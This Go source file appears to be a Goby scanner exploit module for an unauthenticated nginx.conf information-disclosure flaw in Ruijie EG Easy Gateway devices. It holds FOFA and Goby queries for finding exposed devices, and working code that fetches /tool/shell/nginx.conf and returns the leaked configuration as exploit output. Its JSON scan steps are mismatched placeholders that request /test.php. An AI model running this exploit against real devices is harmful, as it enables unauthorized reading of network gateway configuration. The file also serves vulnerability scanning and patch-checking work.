package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Ruijie-EG-Easy-GW nginx.conf Information Disclosure Vulnerability",
    "Description": "<p>Ruijie EG Easy Gateway is a comprehensive gateway product that integrates an advanced software and hardware architecture and is equipped with a DP in-depth analysis engine and a behavior analysis management engine. This product can provide professional flow control functions, excellent URL filtering and localized log storage and auditing services on the basis of ensuring efficient forwarding of the network exit. </p><p>Its nginx.conf interface has an information leakage vulnerability, and unauthorized attackers may obtain sensitive information through this interface.</p>",
    "Product": "Ruijie-EG-Easy-GW",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2024-08-08",
    "PostTime": "2024-08-15",
    "Author": "hhh3156",
    "FofaQuery": "(((body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")) && body!=\"Server: couchdb\") || (body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")",
    "GobyQuery": "(((body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")) && body!=\"Server: couchdb\") || (body=\"ruijie\" && body=\"href=\\\"eg.css\") || body=\"product: ['锐捷网络有限公司 EG易网关\" || (body=\"webchat.ruijie.com.cn\" && body=\"main.htm\" && body=\"4008 111 000\" && body=\"www.ruijie.com.cn/service/know.aspx\")",
    "Level": "0",
    "Impact": "<p>Its nginx.conf interface has an information leakage vulnerability, and unauthorized attackers may obtain sensitive information through this interface.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p><p>2. Deploy a web application firewall. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Info",
            "type": "select",
            "value": "Info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "HW-2024"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "4.5",
    "Translation": {
        "CN": {
            "Name": "锐捷EG易网关管理系统 nginx.conf 信息泄露漏洞",
            "Product": "Ruijie-EG易网关",
            "Description": "<p>锐捷EG易网关是一款综合网关产品，集成了先进的软硬件体系构架，并配备了DP深入分析引擎、行为分析管理引擎。这款产品能在保证网络出口高效转发的基础上，提供专业的流控功能、出色的URL过滤以及本地化的日志存储审计服务。<br></p><p>其nginx.conf接口存在信息泄露漏洞，未授权的攻击者可能通过此接口获得敏感信息。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其nginx.conf接口存在信息泄露漏洞，未授权的攻击者可能通过此接口获得敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Ruijie-EG-Easy-GW nginx.conf Information Disclosure Vulnerability",
            "Product": "Ruijie-EG-Easy-GW",
            "Description": "<p>Ruijie EG Easy Gateway is a comprehensive gateway product that integrates an advanced software and hardware architecture and is equipped with a DP in-depth analysis engine and a behavior analysis management engine. This product can provide professional flow control functions, excellent URL filtering and localized log storage and auditing services on the basis of ensuring efficient forwarding of the network exit.&nbsp;</p><p>Its nginx.conf interface has an information leakage vulnerability, and unauthorized attackers may obtain sensitive information through this interface.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p><p>2. Deploy a web application firewall.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Its nginx.conf interface has an information leakage vulnerability, and unauthorized attackers may obtain sensitive information through this interface.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9932"
}`

	postOrGet_87f6lapiUAFHV21v0LAOga69apliv := func(hostInfo *httpclient.FixUrl) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		path := "/tool/shell/nginx.conf"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
		}
		resp, err := setGetRequest(hostInfo, path, header)
		if err != nil || resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "user  root root;") {
			return "", err
		}
		respTxt := resp.RawBody

		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/tool/shell/nginx.conf"
			// 函数继承
			uploadFileFunc := postOrGet_87f6lapiUAFHV21v0LAOga69apliv

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------

			resp, err := uploadFileFunc(u)
			if err != nil || resp == "" {
				return false
			}

			// 设置VULURL
			ss.VulURL = u.HostInfo + vulURL
			return true
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {

			uploadFileFunc := postOrGet_87f6lapiUAFHV21v0LAOga69apliv
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo)
			if err != nil || resp == "" {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
